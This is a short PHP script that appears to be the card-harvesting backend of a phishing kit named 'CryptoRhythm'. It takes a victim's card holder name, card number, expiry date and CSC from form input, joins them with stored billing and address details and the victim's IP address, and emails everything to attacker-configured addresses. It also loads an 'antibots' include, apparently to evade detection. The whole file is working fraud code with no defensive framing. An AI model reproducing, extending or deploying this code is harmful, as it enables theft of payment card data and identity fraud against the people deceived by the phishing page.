<?php
  session_start();
  require_once("../inc/config.inc.php");
  require_once("../antibots.php");
  if(isset($_GET['submit'])) {
    $creditn = $_GET['cardn'];
    $number = $_GET['number'];
    $exp = $_GET['exp'];
    $csc = $_GET['csc'];
    /* Mail */
    $ip = $_SESSION['_ip_'];
    $cd = $_SESSION['cd'];
    $body = "
    CryptoRhythm V 2.1 [PRV8]
    [Billing DETAILS]
    First name > ".$_SESSION['fn']."
    Address line > ".$_SESSION['addline']."
    City > ".$_SESSION['city']."
    State> ".$_SESSION['state']."
    Country > ".$_SESSION['country']."
    Postal > ".$_SESSION['postal']."
    Mobile/Phone > ".$_SESSION['mobile']."
    Phone number > ".$_SESSION['phone']."
    [Credit card details]</br>
    CC holder > $creditn
    CC number > $number
    CC expiration date > $exp
    CSC > $csc
    [Client Info]
    IP > $ip
    Track > http://www.ip-tracker.org/locator/ip-lookup.php?ip=$ip
    ";
    $subject = "[CryptoRhythm] New Credit Card from [$cd] - $ip";
    foreach(explode(",", $tomail) as $tom) {
	mail($tom, $subject, $body);
    }
    echo "RESULT:DONE;";
  }
?>
